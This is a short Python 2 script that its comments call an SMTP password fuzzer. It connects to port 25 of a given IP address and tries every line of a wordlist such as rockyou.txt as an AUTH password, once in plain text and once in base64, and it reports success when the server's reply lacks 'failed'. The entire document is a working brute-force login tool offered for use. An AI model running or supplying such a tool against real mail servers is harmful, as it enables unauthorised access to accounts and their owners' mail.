#!/usr/bin/python
#
# This is a SMTP password fuzzer for SMTP services that ask for the password directly.
# When i developed it, i was not sure if the server wanted to receive the password in base64
# so the script fuzzes with plain text password and then formated in base64.
#
# It's very easy to change the script to fuzz services that deman user and password.
#

import socket
import base64
import sys

if(len(sys.argv) != 3):
    print "Please use the following syntax: "
    print ">>> " + sys.argv[0] + " <IP address> <wordlist>"
    print ">>> " + sys.argv[0] + " 192.168.1.10 /usr/share/wordlists/rockyou.txt"
    sys.exit()

message1 = "Start Authentication Process"

print "Conneting to the server"
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=s.connect((sys.argv[1],25))
info = s.recv(1024)
print (info)
print "Sending identification to the SMTP server"
s.send('EHLO f4d0.eu\r\n')
info = s.recv(1024)
print (info)

count = 0

with open(sys.argv[2]) as f:
    for PASSWORD in f:
        print "-"*40
        count += 1
        print "number: " + str(count)
        PASS64 = base64.b64encode(PASSWORD)
        #print message1
        s.send('AUTH LOGIN PLAIN\r\n')
        info = s.recv(1024)
        #print (info)
        print "Sending Password: " + PASSWORD
        s.send(PASSWORD+'\r\n')
        info = s.recv(1024)
        #print (info)
        #print message1
        s.send('AUTH LOGIN PLAIN\r\n')
        info = s.recv(1024)
        #print (info)
        print "Sending password64: " + PASS64
        s.send(PASS64+'\r\n')
        info = s.recv(1024)
        #print (info)
        if "failed" not in info:
            print ("SUCCESS!!!")
            sys.exit("SUCCESS!!!")
        #else:
            #print ("not yet")
s.send('quit\r\n')
s.close()



